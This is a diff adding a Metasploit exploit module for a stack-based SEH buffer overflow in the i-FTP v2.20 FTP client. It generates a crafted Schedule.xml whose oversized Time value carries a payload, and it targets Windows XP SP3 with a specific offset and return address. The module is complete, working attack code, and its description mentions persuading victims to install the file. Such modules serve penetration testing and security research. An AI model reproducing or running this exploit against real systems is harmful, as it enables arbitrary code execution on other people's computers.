@@ -1,0 +1,95 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rexml/document'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Remote::Seh
+  include REXML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'i-FTP Schedule Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack-based buffer overflow vulnerability in
+        i-Ftp v2.20, caused by a long time value set for scheduled download.
+        By persuading the victim to place a specially-crafted Schedule.xml file
+        in the i-FTP folder, a remote attacker could execute arbitrary code on
+        the system or cause the application to crash. This module has been
+        tested successfully on Windows XP SP3.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'metacom',      # Vulnerability discovery and PoC
+          'Gabor Seljan'  # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'EDB', '35177' ],
+          [ 'OSVDB', '114279' ],
+        ],
+      'DefaultOptions' =>
+        {
+          'ExitFunction' => 'process'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00\x0a\x0d\x20\x22",
+          'Space'      => 2000
+        },
+      'Targets'        =>
+        [
+          [ 'Windows XP SP3',
+            {
+              'Offset' => 600,
+              'Ret'    => 0x1001eade  # POP ECX # POP ECX # RET [Lgi.dll]
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Nov 06 2014',
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('FILENAME', [ false, 'The file name.', 'Schedule.xml'])
+        ],
+      self.class)
+
+  end
+
+  def exploit
+
+    evil =  rand_text_alpha(target['Offset'])
+    evil << generate_seh_payload(target.ret)
+    evil << rand_text_alpha(20000)
+
+    xml = Document.new
+    xml << XMLDecl.new('1.0', 'UTF-8')
+    xml.add_element('Schedule', {})
+    xml.elements[1].add_element(
+      'Event',
+      {
+        'Url' => '',
+        'Time' => 'EVIL',
+        'Folder' => ''
+      })
+
+    sploit = ''
+    xml.write(sploit, 2)
+    sploit = sploit.gsub(/EVIL/, evil)
+
+    # Create the file
+    print_status("Creating '#{datastore['FILENAME']}' file ...")
+    file_create(sploit)
+
+  end
+end
